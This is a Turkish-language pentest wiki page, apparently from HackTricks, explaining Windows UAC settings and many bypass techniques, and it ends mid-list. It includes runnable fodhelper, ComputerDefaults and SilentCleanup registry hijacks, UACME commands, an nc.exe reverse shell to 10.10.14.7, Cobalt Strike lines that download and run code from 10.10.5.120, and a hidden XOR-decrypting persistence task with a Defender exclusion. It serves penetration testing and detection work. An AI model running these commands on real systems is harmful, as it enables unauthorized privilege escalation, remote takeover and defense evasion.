# UAC - Kullanıcı Hesabı Denetimi

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kullanıcı Hesabı Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş ayrıcalık gerektiren etkinlikler için onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `bütünlük` düzeyleri vardır ve **yüksek düzeydeki** bir program, **sistemi tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda uygulamalar ve görevler, yönetici bu uygulamaların/görevlerin çalışması için sisteme yönetici düzeyinde erişim izni vermediği sürece **her zaman yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklere karşı koruyan bir kolaylık özelliğidir; ancak bir güvenlik sınırı olarak kabul edilmez.<sup>[[2]](#references)</sup>

Bütünlük düzeyleri hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC etkin olduğunda yönetici kullanıcıya 2 token verilir: normal işlemleri orta bütünlük düzeyinde gerçekleştirmek için standart bir kullanıcı token'ı ve yönetici ayrıcalıklarına sahip bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), oturum açma sürecini, kullanıcı deneyimini ve UAC mimarisini de kapsayarak UAC'nin nasıl çalıştığını ayrıntılı biçimde açıklar.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin kuruluşlarına özgü çalışma şeklini yerel düzeyde (secpol.msc kullanarak) yapılandırmak veya Active Directory etki alanı ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtmak için güvenlik ilkelerini kullanabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı biçimde açıklanmıştır. UAC için ayarlanabilecek 10 Group Policy ayarı vardır. Aşağıdaki tabloda ek ayrıntılar verilmiştir:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kullanıcı Hesabı Denetimi: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Devre dışı)                                             |
| [Kullanıcı Hesabı Denetimi: Admin Approval Mode'daki yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Güvenli masaüstünde Windows dışı ikili dosyalar için onay iste) |
| [Kullanıcı Hesabı Denetimi: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Güvenli masaüstünde kimlik bilgilerini iste)         |
| [Kullanıcı Hesabı Denetimi: Uygulama yüklemelerini algıla ve yükseltme iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Etkin; Enterprise sürümünde varsayılan olarak devre dışı)           |
| [Kullanıcı Hesabı Denetimi: Yalnızca imzalanmış ve doğrulanmış yürütülebilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Devre dışı)                                             |
| [Kullanıcı Hesabı Denetimi: Yalnızca güvenli konumlara yüklenen UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Etkin)                                              |
| [Kullanıcı Hesabı Denetimi: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Etkin)                                              |
| [Kullanıcı Hesabı Denetimi: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Devre dışı)                                             |
| [Kullanıcı Hesabı Denetimi: Yükseltme istenirken güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Etkin)                                              |
| [Kullanıcı Hesabı Denetimi: Dosya ve kayıt defteri yazma hatalarını kullanıcı başına konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Etkin)                                              |

### Windows'ta yazılım yüklemeye yönelik ilkeler

**Yerel güvenlik ilkeleri** (çoğu sistemde "secpol.msc"), varsayılan olarak **yönetici olmayan kullanıcıların yazılım yüklemesini önleyecek** şekilde yapılandırılmıştır. Bu, yönetici olmayan bir kullanıcı yazılımınızın yükleyicisini indirebilse bile yönetici hesabı olmadan çalıştıramayacağı anlamına gelir.

### UAC'nin Yükseltme İstemesini Sağlayan Registry Key'ler

Yönetici hakları olmayan standart bir kullanıcı olarak, "standart" hesabın belirli işlemleri yapmaya çalıştığında **UAC'nin kimlik bilgilerini istemesini** sağlayabilirsiniz. Bunun için belirli **registry key'lerini** değiştirmeniz gerekir; bir **UAC bypass** yoksa veya saldırgan zaten yönetici olarak oturum açmış değilse, bu işlem yönetici izinleri gerektirir.

Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, yönetim işlemlerini gerçekleştirebilmesi için kullanıcının **hesap kimlik bilgilerini yeniden girmesini** sağlar.

**Uygulamada bu, yalnızca yükseltilmiş bir token'a, bir UAC bypass'a veya bu key'leri değiştirmenize olanak tanıyan bir yanlış yapılandırmaya zaten sahipseniz işe yarar; aksi takdirde registry'ye yazma işlemi engellenir.**

Değiştirmeniz gereken registry key'leri ve girdileri (varsayılan değerleri parantez içinde) şunlardır:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı kullanılarak manuel olarak da yapılabilir. Değişiklik yapıldıktan sonra yönetim işlemleri, kullanıcının kimlik bilgilerini yeniden girmesini ister.

### Not

**User Account Control bir güvenlik sınırı değildir.** Bu nedenle standart kullanıcılar, yerel bir privilege escalation exploit olmadan hesaplarından çıkıp yönetici hakları elde edemez.

### Bir kullanıcıdan 'bilgisayara tam erişim' isteme

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC Ayrıcalıkları

- Internet Explorer Protected Mode, yüksek bütünlük düzeyindeki süreçlerin (web tarayıcıları gibi) düşük bütünlük düzeyindeki verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük denetimlerini kullanır. Bu, tarayıcı düşük bütünlük belirtecine sahip olarak çalıştırılarak yapılır. Tarayıcı düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında, işletim sistemi sürecin bütünlük düzeyini denetler ve erişime buna göre izin verir. Bu özellik, uzaktan kod yürütme saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının listesini içeren bir erişim belirteci oluşturur. Ayrıcalıklar, kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Belirteç ayrıca kullanıcının kimlik bilgilerinin listesini de içerir. Bu kimlik bilgileri, kullanıcıyı bilgisayarda ve ağdaki kaynaklarda doğrulamak için kullanılır.

### Autoadminlogon

Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı registry içinde açığa çıkardığından bunu yalnızca güvenli sistemlerde kullanın.

Registry Editor'ü veya `reg add` komutunu kullanarak aşağıdaki anahtarları ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Normal oturum açma davranışına dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Kurban makineye grafiksel erişiminiz varsa UAC bypass işleminin çok kolay olduğunu unutmayın; UAC istemi göründüğünde "Yes" düğmesine tıklamanız yeterlidir.

UAC bypass şu durumda gereklidir: **UAC etkin, süreciniz orta bütünlük bağlamında çalışıyor ve kullanıcınız administrators grubuna ait**.

UAC'nin en yüksek güvenlik düzeyinde (Always) olduğu durumda bypass işleminin, diğer düzeylerden herhangi birinde (Default) olduğuna kıyasla **çok daha zor** olduğunu belirtmek önemlidir.

### Orta bütünlük düzeyindeki bir shell'den hızlı triage

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen çalışan yöntemlerle eşleştirin:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Pratik notlar:
- `EnableLUA=0` ise bypass yapmanız gerekmez: herhangi bir admin token doğrudan high integrity isteyebilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM tabanlı bypass'lar için yaygın senaryodur.
- `Always Notify` çıtayı yükseltir, ancak başarısız olacağını varsaymak yerine tam build'i test etmelisiniz: UACME, modern Windows build'lerinde hâlâ `AlwaysNotify compatible` bazı yöntemleri izlemektedir.<sup>[[3]](#references)</sup>

### UAC devre dışı

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), şöyle bir şey kullanarak **admin ayrıcalıklarıyla reverse shell çalıştırabilirsiniz** (yüksek bütünlük düzeyi):

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + yeniden kullanılabilir debug object

AppInfo local RPC arayüzü `201ef99a-7fa0-444c-9399-19ba84f12a1a`, debugging etkin bir process oluşturabilir. Aynı thread'de debug ile oluşturulan process'ler thread'in debug object'ini paylaşır; oluşturma debug event'i, RPC sonucu yalnızca sınırlı erişim verse bile tam erişimli bir process handle taşır. Böylece debug object'in yeniden kullanılması, Administrators grubunun orta bütünlük düzeyindeki bir üyesi için UAC primitive'ine dönüşür.<sup>[[11]](#references)[[12]](#references)</sup>

Uygulanabilir bir zincir şöyledir:<sup>[[11]](#references)[[12]](#references)</sup>

1. Debugging etkin, yükseltilmemiş geçici bir process oluşturmak için local RPC yöntemini (doğrudan veya `NdrAsyncClientCall` üzerinden) çağırın.
2. `NtQueryInformationProcess` ile `ProcessDebugObjectHandle` değerini sorgulayın, `NtRemoveProcessDebug` ile bağlantıyı kesin, object'i saklayın ve geçici process'i sonlandırın.
3. Güvenilir, otomatik yükseltilen bir process oluşturmak için aynı RPC arayüzünü kullanın, ardından `DbgUiSetThreadDebugObject` üzerinden saklanan object'i çağıran thread ile ilişkilendirin.
4. `WaitForDebugEvent` çağırın ve `CREATE_PROCESS_DEBUG_EVENT` process handle'ını alın; devam etmeden önce `NtDuplicateObject` ile çoğaltın.
5. Çoğaltılan handle'ı `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` işlevine verin ve genişletilmiş bir startup-info yapısıyla payload'u başlatın. Bu, hem yükseltilmiş process bağlamının yeniden kullanılmasını sağlar hem de child process'e güvenilir görünen bir parent ilişkisi verir.

Yalnızca otomatik yükseltilen binary'yi değil, kısa işlem dizisini de arayın: local AppInfo RPC process oluşturma, `ProcessDebugObjectHandle` sorguları, debugger bağlantısının kesilip yeniden kurulması, hemen ardından gelen bir creation-debug event'i, handle çoğaltma ve kaydedilen parent'ı oluşturma API'lerini çağıran process ile eşleşmeyen bir child process.<sup>[[12]](#references)</sup>

### **Çok** Temel UAC "bypass" (tam dosya sistemi erişimi)

Administrators grubunda bulunan bir kullanıcının shell'ine sahipseniz, SMB üzerinden paylaşılan **C$**'ı (dosya sistemi) yeni bir diske yerel olarak **mount** edebilirsiniz. Böylece **dosya sistemindeki her şeye** (Administrator home klasörü dahil) erişebilirsiniz.

> [!WARNING]
> **Bu yöntem artık çalışmıyor gibi görünüyor**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Cobalt Strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC en yüksek güvenlik düzeyine ayarlanmamışsa işe yarar.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** ve **Metasploit**'te **UAC**'yi **bypass** etmek için çeşitli modüller de bulunur.

### Yükseltilmiş COM arayüzleri (`ICMLuaUtil` / `CMSTPLUA`)

Otomatik yükseltilen COM nesneleri, güncel derlemelerde hâlâ pratik bir UAC saldırı yüzeyidir. `ICMLuaUtil`, UACME'de güncel Windows sürümlerinde çalıştığı belirtilerek izlenmeye devam ediyor. Saldırı araçları ise `CMSTPLUA`'yı; etkileşimli bir masaüstü süreci, 64 bit yürütme ve bazen COM Elevation Moniker'ı çağırmadan önce PEB/süreç taklidi yöntemlerini birleştirerek kullanmaya uyarlamayı sürdürüyor.<sup>[[3]](#references)</sup>

Pratik ipuçları:
- Kullanıcının **etkileşimli oturumunda** çalışan **64 bit** bir süreci tercih edin (genellikle `explorer.exe` veya onun alt süreci).
- Ham bir shell başarısız olursa, basit bir `CreateProcess` sarmalayıcısı yerine bir BOF / UACME uygulamasından yeniden deneyin.
- Alt sürecin **ayrı bir yükseltilmiş süreçte** çalışmasını bekleyin; birçok BOF, mevcut beacon'ı yerinde yükseltmez.

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) adresinde belgelendirme ve araç bulunur.

### UAC bypass açıkları

[**UACME**](https://github.com/hfiref0x/UACME), UAC bypass tekniklerinden oluşan bir koleksiyondur. Visual Studio veya MSBuild ile derleyin; derleme birkaç çalıştırılabilir dosya oluşturur (örneğin, `Source\Akagi\output\x64\Debug\Akagi.exe`), bu nedenle hedef derlemeye uygun yöntemi seçin.<sup>[[3]](#references)</sup>\
Dikkatli olun: bazı bypass yöntemleri, kullanıcıyı uyarabilecek görünür programlar veya istemler başlatır.<sup>[[3]](#references)</sup>

UACME'de **her tekniğin çalışmaya başladığı derleme sürümü** belirtilir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak build sürümlerinden Windows sürümü `1607`'yi bulabilirsiniz.

Pratik bir iş akışında önce **host build'ini puanlayın**, ardından eşleşen yöntemi çalıştırın:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızla karşılaştırır; bu da işe yaramayan PoC'leri hızla elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
- `UACME`, bir bypass'ı belirli bir build ile eşleştirmek için en iyi herkese açık katalog olmayı sürdürüyor. 3.7.1 sürümü 83–85 yöntemlerini eklerken, önceki sürüm mevcut yöntemleri **Windows 11 25H2** üzerinde yeniden test etti; eski bir PoC'nin değişmeden hâlâ geçerli olduğunu varsaymak yerine yöntem tablosunu ve sürüm notlarını yeniden kontrol edin.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify ile uyumlu WNF/UIAccess zincirleri (UACME 3.7.1)

`Always Notify`, tüm UAC bypass'lerini ortadan kaldırmaz. UACME 3.7.1, kullanıcı denetimindeki ortam/protokol durumunu yükseltilmiş zamanlanmış görev veya UIAccess davranışıyla birleştiren üç yeni x64 yöntemi uygular ve bunların tümünü `AlwaysNotify compatible` olarak işaretler:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` değerini yönlendirerek WNF tetiklemeli `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` görevinin, yükseltilmiş `taskhostw.exe` işlemiyle `unifiedconsent.dll` dosyasını side-load etmesini sağlar. UACME, bu yöntemi Windows 10 build 19041'den itibaren takip ediyor.
- **84 — TabTip:** Aynı ortam değişkeni primitive'ini UIAccess `TabTip.exe` işleminde kullanır. Bu işlem build'e bağlı olarak `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` veya `rsaenh.dll` dosyalarından birini yükler; ardından ortaya çıkan high-integrity UIAccess bağlamından pivot yapılır. UACME, bu yöntemi Windows 8.1 / Server 2016'dan itibaren takip ediyor.
- **85 — Narrator:** kullanıcı başına `feedback-hub` protokolünü ele geçirir, Narrator'ı `Alt+CapsLock+F` ile çalıştırır ve ardından `OskSupport.dll` dosyasını side-load eden yazılabilir bir `osk.exe` kopyası başlatır. Bu yöntem etkileşimli bir masaüstü gerektirir ve Windows 10 1809 / Server 2019'dan itibaren takip ediliyor.

Payload unit'lerini ve Akagi'yi UACME belgelerinde açıklandığı şekilde derledikten sonra, eşleşen yöntem numarasını kullanın (isteğe bağlı komutun varsayılanı `cmd.exe`'dir):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methods 84 ve 85, UIAccess/desktop etkileşimine bağlıdır; bu nedenle Session 0'dan veya etkileşimli olmayan bir service shell'den değiştirilmeden çalışmasını beklemeyin. Üçü de environment/protocol state'i değiştirir ve DLL'leri hazırlar; implementation'ı inceleyin ve testten sonra bu artıkları kaldırın.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilir `fodhelper.exe` binary'si modern Windows'ta otomatik olarak yükseltilir. Başlatıldığında, aşağıdaki per-user registry path'ini `DelegateExecute` verb'ini doğrulamadan sorgular. Buraya bir komut yerleştirmek, Medium Integrity seviyesindeki bir process'in (kullanıcı Administrators grubundadır) UAC prompt'u olmadan High Integrity seviyesinde bir process başlatmasını sağlar.

fodhelper tarafından sorgulanan registry path'i:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notlar:
- Geçerli kullanıcı Administrators grubunun üyesiyse ve UAC düzeyi varsayılan/gevşek ayardaysa çalışır (ek kısıtlamalar içeren Always Notify ayarında çalışmaz).
- 64-bit Windows'ta 32-bit bir süreçten 64-bit PowerShell başlatmak için `sysnative` yolunu kullanın.
- Payload herhangi bir komut olabilir (PowerShell, cmd veya bir EXE yolu). Gizlilik için istem gösteren arayüzlerden kaçının.

#### Aynı `ms-settings` handler'ı için `ComputerDefaults.exe` tetikleyicisi

`ComputerDefaults.exe`, `fodhelper.exe` ile aynı kullanıcı başına `ms-settings\Shell\Open\command` ilişkilendirmesini çözümler.<sup>[[13]](#references)[[14]](#references)</sup> Yukarıdaki varsayılan komutu ve boş `DelegateExecute` değerini ayarladıktan sonra alternatif bir tetikleyici olarak `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` komutunu kullanın; registry kurulumunu tekrarlamayın.<sup>[[13]](#references)[[14]](#references)</sup> Yukarıdaki `fodhelper.exe` notlarında belirtilen orta bütünlüklü yönetici ve UAC ilkesi önkoşulları burada da geçerlidir.<sup>[[2]](#references)[[3]](#references)</sup> UACME bu tetikleyiciyi Windows 10 RS4'ten (build 17134) itibaren listeler; bu nedenle hedef build üzerinde doğrulayın.<sup>[[3]](#references)</sup>

#### CurVer/uzantı hijack varyantı (yalnızca HKCU)

`fodhelper.exe`'yi kötüye kullanan güncel örnekler `DelegateExecute` kullanmak yerine kullanıcı başına `CurVer` değeri üzerinden **`ms-settings` ProgID'sini yönlendirir**. Auto-elevated ikili dosya handler'ı `HKCU` altında çözümlemeye devam ettiğinden, anahtarları oluşturmak için yönetici token'ı gerekmez:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Yetki yükseltildikten sonra malware genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**; ardından ek defense evasion işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve high integrity ile çalışması için persistence'ı yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR ile şifrelenmiş bir PowerShell scripti** saklar ve her saat başı bellekte çözüp çalıştırır:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Bu varyant yine dropper'ı temizleyip yalnızca staged payloads'ları bırakır; bu nedenle tespit, **`CurVer` hijack**'ini, `ConsentPromptBehaviorAdmin` üzerinde yapılan değişiklikleri, Defender exclusion oluşturulmasını veya bellekteki PowerShell'in şifresini çözen scheduled task'ları izlemeye dayanır.<sup>[[5]](#references)</sup>

### `SilentCleanup` task üzerinden UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve kullanıcı ortamındaki `%windir%` değerini genişletir. `HKCU\Environment\windir` değerini denetleyebiliyorsanız, bu genişletmeyi rastgele bir komuta yönlendirerek onay iletişim kutusu olmadan high integrity elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME bu tekniği etkin tutmaya devam ettiği ve son sorun takibi Windows 11 24H2'de yalnızca küçük tırnak işareti düzenlemelerinin gerekebileceğini gösterdiği için bu yöntemi güncel build'lerde test etmeye değer.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Görev bu build'de yolu tırnak içine alıyorsa, payload'ı tırnak işaretiyle bitirerek yeniden deneyin (örneğin `cmd.exe"`). Testten sonra `HKCU\Environment\windir` değerini mutlaka temizleyin.

#### Daha fazla UAC bypass

UI akışlarını, COM nesnelerini veya masaüstü etkileşimini kötüye kullanan birçok klasik UAC bypass, kurbanla **tam etkileşimli bir oturum** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0**'da çalışan bir servis çoğu zaman yeterli olmaz.

Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değeri **1** olan bir **process**'e migrate edin:

![ms-settings'i özel bir uzantıya (.thm) yönlendirin ve bu uzantıyı payload'ımıza eşleyin - Daha fazla UAC bypass: Bir meterpreter oturumu kullanarak bunu yapabilirsiniz. Session...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalı)

### GUI ile UAC Bypass

Bir **GUI'ye erişiminiz varsa, UAC prompt'u göründüğünde kabul edebilirsiniz**; teknik bir bypass'a aslında ihtiyacınız yoktur. Bu nedenle, GUI oturumu elde etmek genellikle UAC'nin yarattığı pratik engeli aşmak için yeterlidir.

Ayrıca, birinin kullandığı (muhtemelen RDP üzerinden) bir GUI oturumu elde ederseniz, **administrator olarak çalışan bazı araçlar** bulunabilir. Bu araçlar üzerinden, UAC tarafından tekrar sorulmadan doğrudan **admin olarak** örneğin bir **cmd** **çalıştırabilirsiniz**: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültü sorun değilse, [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir araç, kullanıcı kabul edene kadar yükseltme isteğini tekrar tekrar gönderebilir.

### Kendi bypass'ınız - Temel UAC bypass metodolojisi

**UACME**'ye bakarsanız, **birçok UAC bypass'ın DLL hijacking'i kötüye kullandığını** fark edeceksiniz (genellikle yükseltilmiş bir binary'ye, yazılabilir bir yoldaki saldırgan kontrollü bir DLL'i yükleterek). [DLL hijacking zafiyetini bulmayı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level'da çalıştığını doğrulayın).
2. Procmon ile **DLL Hijacking**'e karşı savunmasız olabilecek "**NAME NOT FOUND**" event'lerini bulun.
